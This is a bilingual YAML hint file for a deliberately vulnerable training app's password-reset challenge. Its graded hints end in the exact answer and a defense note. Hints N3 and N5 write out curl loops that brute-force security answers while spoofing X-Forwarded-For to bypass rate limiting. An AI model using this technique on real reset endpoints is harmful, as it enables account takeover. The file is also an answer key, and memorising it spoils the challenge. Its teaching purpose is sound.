challenge_key: "resetPasswordMortyChallenge"
schema_version: "juicelab.hints.v2"

hints:
  N1:
    cost_pct: 5
    text_fr: |
      Hint OWASP : "rate limiter X-Forwarded-For". Le reset password
      endpoint est rate-limited mais la cle utilisee est X-Forwarded-For
      (proxy header) qui peut etre spoofe.
    text_en: |
      OWASP hint: "rate limiter X-Forwarded-For". Reset password endpoint
      is rate-limited but the key used is X-Forwarded-For (proxy header)
      that can be spoofed.
    pedagogical_intent: |
      Activate XFF + bruteforce reflex.

  N2:
    cost_pct: 10
    text_fr: |
      User cible : Morty (memoire Rick & Morty). Sa security question :
      "Pet name". Sa pet est connue dans la serie - Snowball (chien
      genie). Variantes possibles : Snowball, snowball, 5N0wb41L (leet).
    text_en: |
      Target user: Morty (Rick & Morty memory). His security question:
      "Pet name". His pet is famous in show - Snowball (genius dog).
      Possible variants: Snowball, snowball, 5N0wb41L (leet).
    pedagogical_intent: |
      Spell OSINT angle.

  N3:
    cost_pct: 20
    text_fr: |
      Bruteforce avec X-Forwarded-For rotation pour bypass rate limit :
      `for ans in Snowball snowball 5N0wb41L; do curl -X POST
      -H "X-Forwarded-For: 1.2.3.$RANDOM" -H "Content-Type:
      application/json" -d "{\"email\":\"morty@juice-sh.op\",
      \"answer\":\"$ans\",\"new\":\"x\",\"repeat\":\"x\"}"
      http://localhost:3000/rest/user/reset-password; done`.
    text_en: |
      Bruteforce with X-Forwarded-For rotation to bypass rate limit:
      `for ans in Snowball snowball 5N0wb41L; do curl -X POST
      -H "X-Forwarded-For: 1.2.3.$RANDOM" -H "Content-Type:
      application/json" -d "{\"email\":\"morty@juice-sh.op\",
      \"answer\":\"$ans\",\"new\":\"x\",\"repeat\":\"x\"}"
      http://localhost:3000/rest/user/reset-password; done`.
    pedagogical_intent: |
      Reveal exact bash.

  N4:
    cost_pct: 35
    text_fr: |
      Reponse exacte : `5N0wb41L` (leet pour Snowball). Le
      `keyGenerator: headers['X-Forwarded-For'] ?? ip` (server.ts:347)
      utilise le header spoofe. Avec rotation aleatoire, le rate limit
      compte chaque req comme un IP different.
    text_en: |
      Exact answer: `5N0wb41L` (leet for Snowball). The
      `keyGenerator: headers['X-Forwarded-For'] ?? ip` (server.ts:347)
      uses spoofed header. With random rotation, rate limit counts each
      req as different IP.
    pedagogical_intent: |
      Spell exact answer.

  N5:
    cost_pct: 50
    text_fr: |
      [KILL_CHAIN_DOCUMENTED] Workflow : (1) Lire server.ts:344-347 :
      `rateLimit({ windowMs: 5 * 60 * 1000, max: 100, keyGenerator(
      { headers, ip }) { return headers['X-Forwarded-For'] ?? ip } })`.
      (2) OSINT Morty : Snowball (S01E02 Rick & Morty pet). (3) Tester
      sans XFF : 100 essais ok puis 429. (4) Bash bruteforce wordlist
      avec XFF rotation :
      `for ans in $(cat words.txt); do curl -X POST -H "X-Forwarded-For:
      $RANDOM.$RANDOM.$RANDOM.$RANDOM" -H "Content-Type:
      application/json" -d "{\"email\":\"morty@juice-sh.op\",\"answer\":
      \"$ans\",\"new\":\"x\",\"repeat\":\"x\"}"
      http://localhost:3000/rest/user/reset-password; done | grep
      -v "Wrong"`. (5) "5N0wb41L" -> 200 OK. (6) resetPassword.ts:61
      `solveIf(() => user.id === users.morty.id && answer === '5N0wb41L')`
      declenche. Defense : `trust proxy N` strict + composite key (email
      + IP) + lock account apres M attempts. Source : server.ts:344-347 +
      resetPassword.ts:61.
    text_en: |
      [KILL_CHAIN_DOCUMENTED] Workflow: (1) Read server.ts:344-347:
      `rateLimit({ windowMs: 5 * 60 * 1000, max: 100, keyGenerator(
      { headers, ip }) { return headers['X-Forwarded-For'] ?? ip } })`.
      (2) OSINT Morty: Snowball (S01E02 Rick & Morty pet). (3) Test
      without XFF: 100 attempts ok then 429. (4) Bash bruteforce wordlist
      with XFF rotation:
      `for ans in $(cat words.txt); do curl -X POST -H "X-Forwarded-For:
      $RANDOM.$RANDOM.$RANDOM.$RANDOM" -H "Content-Type:
      application/json" -d "{\"email\":\"morty@juice-sh.op\",\"answer\":
      \"$ans\",\"new\":\"x\",\"repeat\":\"x\"}"
      http://localhost:3000/rest/user/reset-password; done | grep
      -v "Wrong"`. (5) "5N0wb41L" -> 200 OK. (6) resetPassword.ts:61
      `solveIf(() => user.id === users.morty.id && answer === '5N0wb41L')`
      triggers. Defense: strict `trust proxy N` + composite key (email +
      IP) + account lock after M attempts. Source: server.ts:344-347 +
      resetPassword.ts:61.
    pedagogical_intent: |
      Solution + canonical defense.
